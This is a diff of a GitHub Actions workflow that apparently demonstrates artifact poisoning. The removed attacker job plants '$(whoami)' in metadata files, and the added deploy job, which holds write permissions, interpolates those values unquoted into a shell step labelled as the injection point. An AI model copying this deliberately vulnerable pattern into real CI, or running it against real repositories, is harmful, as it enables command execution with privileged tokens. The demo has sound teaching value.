@@ -1,18 +1,36 @@
-name: Build adev for preview deployment
-on: [pull_request]
+name: adev-preview-deploy
+on:
+  workflow_run:
+    workflows: ['Build adev for preview deployment']
+    types: [completed]
 
 jobs:
-  adev-build:
+  deploy:
     runs-on: ubuntu-latest
+    permissions:
+      pull-requests: write
+    env:
+      BUILD_DIR: ./build
     steps:
-      - name: Create malicious PR number file
-        run: |
-          echo "$(whoami)" > __metadata__pull_number.txt
-      - name: Create malicious commit hash file
-        run: |
-          echo "$(whoami)" > __metadata__commit_hash.txt
-      - name: Upload artifact
-        uses: actions/upload-artifact@v4
+      - name: Download adev preview artifact
+        uses: actions/download-artifact@v4
         with:
           name: adev-preview
-          path: .
+          path: ${{ env.BUILD_DIR }}
+          run-id: ${{ github.event.workflow_run.id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Extract pull request number
+        id: pr-number
+        run: |
+          PR_NUMBER=$(cat $BUILD_DIR/__metadata__pull_number.txt)
+          echo "value=$PR_NUMBER" >> $GITHUB_OUTPUT
+
+      - name: Extract commit hash
+        id: commit-hash
+        run: |
+          COMMIT_HASH=$(cat $BUILD_DIR/__metadata__commit_hash.txt)
+          echo "value=$COMMIT_HASH" >> $GITHUB_OUTPUT
+
+      - name: Echo values (code injection happens here)
+        run: echo ${{ steps.pr-number.outputs.value }} ${{ steps.commit-hash.outputs.value }}
